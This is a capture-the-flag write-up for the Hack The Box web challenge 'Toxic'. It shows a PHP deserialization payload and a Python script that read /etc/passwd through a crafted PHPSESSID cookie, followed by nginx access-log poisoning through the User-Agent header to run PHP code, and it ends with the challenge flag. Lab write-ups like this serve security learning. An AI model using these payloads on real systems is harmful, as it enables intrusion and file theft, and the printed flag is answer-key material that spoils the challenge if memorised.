# Toxic | HTB Web Challenge
> `Web`

<br>

In the given source code we can spot that it is vulnerable to deserialization 

<img width="293" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/5fbcaee1-b10f-4765-93ef-7a4be1f4330b">

`PageModel` have magic method `__destruct()` to exploite Deserialization

<img width="206" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/1086d508-0033-4c6b-b6d4-3ec831a0bf87">


payload= 
```
O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
```

```python
import requests
from itsdangerous import base64_encode

a = "PageModel"
b = "/etc/passwd"
payload = 'O:'+str(len(a))+':"'+a+'":1:{s:4:"file";s:'+str(len(b))+':"'+b+'";}'
payload = base64_encode(payload).decode()
r = requests.get("http://83.136.249.57:52345/",cookies={"PHPSESSID": payload},proxies={"http":"http://127.0.0.1:8080/"})
print(r.text)
```

The flag name is random so we need to find a way around

<img width="472" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/23c0c811-0290-4d90-bd9d-96b18d9c09ca">

we can find the path of `/etc/nginx/nginx.conf` in Dockerfile

<img width="317" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/f401a175-f86d-4ed6-9143-77d4b12e1817">

Reading this file we get the path to access log `/var/log/nginx/access.log`

<img width="320" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/76d581a6-12c0-4665-855b-3c5f1bb44d3f">

In access log we see that User-agent is printed 

<img width="571" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/d07a5788-7e8e-4667-b447-f4b5d8036053">

We can try injecting php code:

<img width="185" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/a4b748d2-a890-4c19-bd1c-166ef783e385">
<img width="491" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/d598a5ab-befc-4657-8b69-fde9f91c5230">

and it works 🥲 \
Let's get flag

<img width="217" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/a0a677ec-ee03-460e-84c9-932dc009992f">
<img width="361" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/e25196d7-00c7-4300-b002-11adf36413ff">

Flag: `HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}`

<br>

:octocat: Happy Hacking :octocat:
